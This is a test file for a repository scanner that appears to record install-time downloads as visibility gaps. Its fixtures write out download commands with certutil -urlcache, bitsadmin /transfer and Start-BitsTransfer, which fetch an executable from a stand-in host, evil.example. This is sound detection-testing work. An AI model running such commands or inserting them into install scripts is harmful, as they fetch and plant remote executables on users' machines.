import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: the scan does not retrieve install-time downloads, so
 * each one is collected and stays a visibility gap. A download tool the
 * inventory does not name leaves no record at all; the tools covered
 * here fetch a file from a URL exactly as curl and wget do.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

const DOWNLOADS: Record<string, [string, string, string]> = {
  "aria2c in an install script": [
    "install.sh",
    "#!/bin/sh\naria2c -o tool.tar.gz https://example.com/tool.tar.gz\n",
    "https://example.com/tool.tar.gz",
  ],
  "axel in an install script": [
    "install.sh",
    "#!/bin/sh\naxel -o tool.tar.gz https://example.com/tool.tar.gz\n",
    "https://example.com/tool.tar.gz",
  ],
  "certutil -urlcache in a batch file": [
    "install.bat",
    "certutil -urlcache -f https://evil.example/x.exe x.exe\n",
    "https://evil.example/x.exe",
  ],
  "certutil -urlcache after -f in a batch file": [
    "install.bat",
    "certutil -f -urlcache https://evil.example/x.exe x.exe\n",
    "https://evil.example/x.exe",
  ],
  "bitsadmin /transfer in a batch file": [
    "install.bat",
    "bitsadmin /transfer job https://evil.example/x.exe %TEMP%\\x.exe\n",
    "https://evil.example/x.exe",
  ],
  "Start-BitsTransfer in a PowerShell script": [
    "setup.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.exe -Destination x.exe\n",
    "https://evil.example/x.exe",
  ],
};

test("install-time downloads from the named tools are collected", () => {
  for (const [name, [path, body, url]] of Object.entries(DOWNLOADS)) {
    const inspection = inspected(path, body);
    expect({ name, downloads: inspection.downloads }).toEqual({
      name,
      downloads: [url],
    });
    // A collected download is a visibility gap, never a finding.
    expect({ name, findings: inspection.findings }).toEqual({
      name,
      findings: [],
    });
  }
});

test("curl downloads are still collected", () => {
  const inspection = inspected(
    "install.sh",
    "#!/bin/sh\ncurl -fsSL -o tool.tar.gz https://example.com/tool.tar.gz\n",
  );
  expect(inspection.downloads).toEqual(["https://example.com/tool.tar.gz"]);
});

test("local-file invocations of the same tools collect nothing", () => {
  for (const [path, body] of [
    ["install.bat", "certutil -hashfile local.bin SHA256\n"],
    ["install.bat", "certutil -decode payload.b64 payload.exe\n"],
    ["install.bat", "bitsadmin /list\n"],
    ["install.sh", "#!/bin/sh\naria2c local.torrent\n"],
    ["install.sh", "#!/bin/sh\naxel -o local-copy.bin local.bin\n"],
  ] as const) {
    const inspection = inspected(path, body);
    expect({ body, downloads: inspection.downloads }).toEqual({
      body,
      downloads: [],
    });
  }
});

test("upload-only transfers do not claim an unreviewed download", () => {
  for (const body of [
    "bitsadmin /transfer job /upload /priority normal https://example.com/inbox local.bin\n",
    "Start-BitsTransfer -TransferType Upload -Source local.bin -Destination https://example.com/inbox\n",
  ]) {
    expect(inspected("setup.ps1", body).downloads).toEqual([]);
  }
});
